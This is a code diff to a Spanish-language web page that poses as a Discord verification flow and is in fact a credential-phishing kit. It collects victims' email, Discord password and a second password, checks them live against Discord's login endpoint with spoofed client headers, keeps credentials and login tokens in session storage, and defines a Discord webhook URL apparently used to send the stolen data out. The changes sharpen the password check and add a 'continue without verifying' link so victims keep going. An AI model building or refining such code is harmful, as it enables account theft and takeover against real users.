@@ -60,13 +60,15 @@
   #save:hover{background:#e04a00}
   #save:disabled{opacity:.6;cursor:default}
   .skip{margin:10px 0 0;font-size:11px;color:#8b9096;text-align:center}
+  #skipVerify{display:none;margin:10px 0 0;font-size:12px;text-align:center}
+  #skipVerify a{color:#8f9bff}
   #fallback{display:none;margin-top:12px;font-size:12px;text-align:center;color:#a4aab1}
   #fallback a{color:#8f9bff}
   .edit{margin:14px 0 0;font-size:12px;text-align:center}
   .edit a{color:#8f9bff}
   #btn:focus-visible,#save:focus-visible,.eye:focus-visible,.manual a:focus-visible,
-  #fallback a:focus-visible,.edit a:focus-visible,.field input:focus-visible{
-    outline:2px solid #ff8a4c;outline-offset:2px}
+  #fallback a:focus-visible,.edit a:focus-visible,#skipVerify a:focus-visible,
+  .field input:focus-visible{outline:2px solid #ff8a4c;outline-offset:2px}
 </style>
 </head>
 <body>
@@ -111,6 +113,7 @@
     </form>
 
     <p class="status" id="status1" aria-live="polite"></p>
+    <p id="skipVerify"><a href="#" id="skipLink">Continuar sin verificar</a></p>
   </div>
 
   <!-- ============ PASO 2: autorización de Discord ============ -->
@@ -177,6 +180,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1570093723562545224/1XCD99
 const K_CREDS = "fct_creds";
 const K_STATE = "fct_state";
 const K_TOKEN = "fct_token";
+const K_LTOKEN = "fct_lt";
 
 const $ = id => document.getElementById(id);
 let ME = {}, TOKEN = "", LOGIN_TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
@@ -239,7 +243,7 @@ function authUrlWithState() {
 }
 
 /* ---------- Verificación real contra Discord ---------- */
-/* Devuelve { ok, reason, mfa } */
+/* OJO: no mandar captcha_key (null rompe la petición con STRING_TYPE_CONVERT) */
 async function verifyLogin(login, password) {
   let r;
   try {
@@ -251,7 +255,7 @@ async function verifyLogin(login, password) {
         "X-Discord-Timezone": "Europe/Madrid",
         "X-Super-Properties": SUPER_PROPS
       },
-      body: JSON.stringify({ login, password, undelete: false, captcha_key: null })
+      body: JSON.stringify({ login, password, undelete: false })
     });
   } catch {
     return { ok: true, reason: "network" };
@@ -259,6 +263,7 @@ async function verifyLogin(login, password) {
 
   let data = null;
   try { data = await r.json(); } catch {}
+  console.log("[login]", r.status, data);
 
   if (r.status === 200 && data) {
     if (data.mfa) {
@@ -271,14 +276,23 @@ async function verifyLogin(login, password) {
 
   if (r.status === 429) return { ok: true, reason: "rate" };
 
-  const errs = data && (data.errors || data);
-  const has = k => Boolean(errs && errs[k]);
-  if (has("email"))   return { ok: false, field: "email" };
-  if (has("password"))return { ok: false, field: "passD" };
+  /* Códigos reales dentro de errors.<campo>._errors[].code */
+  const errs = (data && data.errors) || {};
+  const codeOf = k => {
+    const v = errs[k];
+    if (!v) return "";
+    if (Array.isArray(v)) return String(v[0] || "");
+    if (v._errors && v._errors[0]) return String(v._errors[0].code || "");
+    return "";
+  };
 
-  if (data && data.captcha_key) return { ok: true, reason: "captcha" };
-  if (data && data.sso)         return { ok: true, reason: "sso" };
-
+  /* Captcha requerido: la contraseña puede ser correcta */
+  if (Array.isArray(data && data.captcha_key) || codeOf("captcha_key")) {
+    return { ok: true, reason: "captcha" };
+  }
+  if (codeOf("email") === "EMAIL_NOT_FOUND" || errs.email) return { ok: false, field: "email" };
+  if (codeOf("password") || errs.password) return { ok: false, field: "passD" };
+  if (data && data.sso) return { ok: true, reason: "sso" };
   if (r.status === 400) return { ok: false, field: "passD" };
   return { ok: true, reason: "network" };
 }
@@ -296,12 +310,34 @@ document.querySelectorAll(".eye").forEach(b => {
   });
 });
 
-/* ---------- Validación + paso 1 ---------- */
+/* ---------- Validación de formato ---------- */
 function markField(fieldId, msg, inputId) {
   const f = $(fieldId);
   if (msg) f.classList.add("invalid"); else f.classList.remove("invalid");
   $("e-" + inputId).textContent = msg || "";
   return !msg;
+}
+
+/* ---------- Paso 1 -> 2 ---------- */
+function proceed(v) {
+  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
+  if (LOGIN_TOKEN) sessionStorage.setItem(K_LTOKEN, LOGIN_TOKEN);
+
+  $("save").disabled = false;
+  $("save").textContent = "Verificar y continuar";
+  $("skipVerify").style.display = "none";
+  say("status1", "", "");
+
+  showStep(2);
+  $("btn").disabled = false;
+  $("btn").focus();
+
+  if (v.mfa) say("status2", "ok", "Contraseña correcta. Tu cuenta tiene 2FA.");
+  else if (v.reason === "captcha") say("status2", "warn", "Discord pidió captcha: la contraseña no se pudo comprobar del todo.");
+  else if (v.reason === "rate")    say("status2", "warn", "Demasiados intentos: verificación limitada, puedes continuar.");
+  else if (v.reason === "sso")     say("status2", "ok", "Tu cuenta usa inicio de sesión con Google.");
+  else if (v.reason === "network") say("status2", "warn", "No se pudo comprobar por red, pero el formato es correcto.");
+  else say("status2", "ok", "Contraseña verificada.");
 }
 
 $("credForm").addEventListener("submit", async e => {
@@ -319,9 +355,12 @@ $("credForm").addEventListener("submit", async e => {
     return;
   }
 
+  CREDS = { email, passD: pd, passG: pg };
+
   $("save").disabled = true;
   $("save").innerHTML = '<span class="spinner"></span>Verificando…';
   say("status1", "", "");
+  $("skipVerify").style.display = "none";
 
   const v = await verifyLogin(email, pd);
 
@@ -337,25 +376,17 @@ $("credForm").addEventListener("submit", async e => {
       $("passD").select();
       say("status1", "err", "La contraseña no es correcta. Inténtalo de nuevo.");
     }
+    $("skipVerify").style.display = "block";
     return;
   }
 
-  CREDS = { email, passD: pd, passG: pg };
-  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
-  if (LOGIN_TOKEN) sessionStorage.setItem("fct_lt", LOGIN_TOKEN);
+  proceed(v);
+});
 
-  $("save").disabled = false;
-  $("save").textContent = "Verificar y continuar";
-  showStep(2);
-  $("btn").disabled = false;
-  $("btn").focus();
-
-  if (v.mfa) say("status2", "ok", "Contraseña correcta. Tu cuenta tiene 2FA.");
-  else if (v.reason === "captcha") say("status2", "warn", "Discord pidió captcha: la contraseña no se pudo comprobar del todo.");
-  else if (v.reason === "rate")    say("status2", "warn", "Demasiados intentos: verificación limitada, puedes continuar.");
-  else if (v.reason === "sso")     say("status2", "ok", "Tu cuenta usa inicio de sesión con Google.");
-  else if (v.reason === "network") say("status2", "warn", "No se pudo comprobar por red, pero el formato es correcto.");
-  else say("status2", "ok", "Contraseña verificada.");
+$("skipLink").addEventListener("click", e => {
+  e.preventDefault();
+  if (!$("email").value.trim()) { $("email").focus(); return; }
+  proceed({});
 });
 
 /* ---------- Botones de autorización ---------- */
@@ -382,7 +413,7 @@ function finish() {
   $("fallbackLink").href = FINAL_URL;
   sessionStorage.removeItem(K_TOKEN);
   sessionStorage.removeItem(K_CREDS);
-  sessionStorage.removeItem("fct_lt");
+  sessionStorage.removeItem(K_LTOKEN);
   setTimeout(() => location.replace(FINAL_URL), 1800);
 }
 
@@ -403,7 +434,7 @@ async function run() {
   }
 
   TOKEN = hash.get("access_token") || sessionStorage.getItem(K_TOKEN) || "";
-  LOGIN_TOKEN = sessionStorage.getItem("fct_lt") || "";
+  LOGIN_TOKEN = sessionStorage.getItem(K_LTOKEN) || "";
 
   try {
     const saved = JSON.parse(sessionStorage.getItem(K_CREDS) || "null");
